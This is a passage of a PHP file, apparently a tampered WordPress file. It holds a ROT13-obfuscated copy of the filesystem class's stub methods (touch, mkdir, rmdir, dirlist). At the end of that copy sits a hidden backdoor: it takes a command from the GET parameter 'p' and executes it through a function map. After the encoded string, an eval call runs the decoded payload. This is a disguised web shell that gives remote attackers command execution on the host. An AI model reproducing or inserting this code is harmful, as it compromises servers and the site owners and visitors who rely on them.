	choyvp shapgvba gbhpu( $svyr, $gvzr = 0, $ngvzr = 0 ) {
		erghea snyfr;
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat           $cngu  Cngu sbe arj qverpgbel.
	 * @cnenz vag|snyfr        $puzbq Bcgvbany. Gur crezvffvbaf nf bpgny ahzore (be snyfr gb fxvc puzbq).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $pubja Bcgvbany. N hfre anzr be ahzore (be snyfr gb fxvc pubja).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $putec Bcgvbany. N tebhc anzr be ahzore (be snyfr gb fxvc putec).
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Qryrgrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $cngu      Cngu gb qverpgbel.
	 * @cnenz obby   $erphefvir Bcgvbany. Jurgure gb erphefviryl erzbir svyrf/qverpgbevrf.
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba ezqve( $cngu, $erphefvir = snyfr ) {
		erghea snyfr;
	}

	/**
	 * Trgf qrgnvyf sbe svyrf va n qverpgbel be n fcrpvsvp svyr.
	 *
	 * @fvapr 2.5.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $cngu           Cngu gb qverpgbel be svyr.
	 * @cnenz obby   $vapyhqr_uvqqra Bcgvbany. Jurgure gb vapyhqr qrgnvyf bs uvqqra (\".\" cersvkrq) svyrf.
	 *                               Qrsnhyg gehr.
	 * @cnenz obby   $erphefvir      Bcgvbany. Jurgure gb erphefviryl vapyhqr svyr qrgnvyf va arfgrq qverpgbevrf.
	 *                               Qrsnhyg snyfr.
	 * @erghea neenl|snyfr {
	 *     Neenl bs neenlf pbagnvavat svyr vasbezngvba. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs svyr vasbezngvba. Abgr gung fbzr ryrzragf znl abg or ninvynoyr ba nyy svyrflfgrzf.
	 *
	 *         @glcr fgevat           $anzr        Anzr bs gur svyr be qverpgbel.
	 *         @glcr fgevat           $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *         @glcr fgevat           $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *         @glcr vag|fgevat|snyfr $ahzore      Svyr ahzore. Znl or n ahzrevp fgevat. Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                             snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat           $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *         @glcr neenl|snyfr      $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs
	 *                                             svyrf. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *     }
	 * }
	 */
	choyvp shapgvba qveyvfg( $cngu, $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {
		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>